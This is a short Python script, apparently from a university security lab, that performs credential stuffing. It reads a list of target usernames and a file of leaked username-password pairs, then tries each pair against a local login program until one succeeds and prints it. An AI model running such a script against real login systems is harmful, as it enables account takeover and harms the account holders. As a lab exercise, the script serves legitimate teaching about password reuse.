import subprocess
import time
import sys


start = time.time()


pwned_pw_file_path = "/home/cse/Lab1/Q4/PwnedPWfile"
gang_file_path = "/home/cse/Lab1/Q4/gang"
login_script_path = "/home/cse/Lab1/Q4/Login.pyc"


exposed_users = {"SkyRedFalcon914", "MountainPurpleShark585", "ForestGreenShark821"}


with open(gang_file_path, "r") as file:
    users = [line.strip() for line in file if line.strip() not in exposed_users]


with open(pwned_pw_file_path, "r") as file:
    credentials = [line.strip().split(",") for line in file if "," in line]  


for username, password in credentials:
    if username in users:  
        
        result = subprocess.run(
            ["python3", login_script_path, username, password],
            capture_output=True, text=True
        )

        
        if "successful" in result.stdout:
            print(f"Username: {username}, Password: {password}")
            sys.exit()  


sys.exit("No valid username-password combination found.")
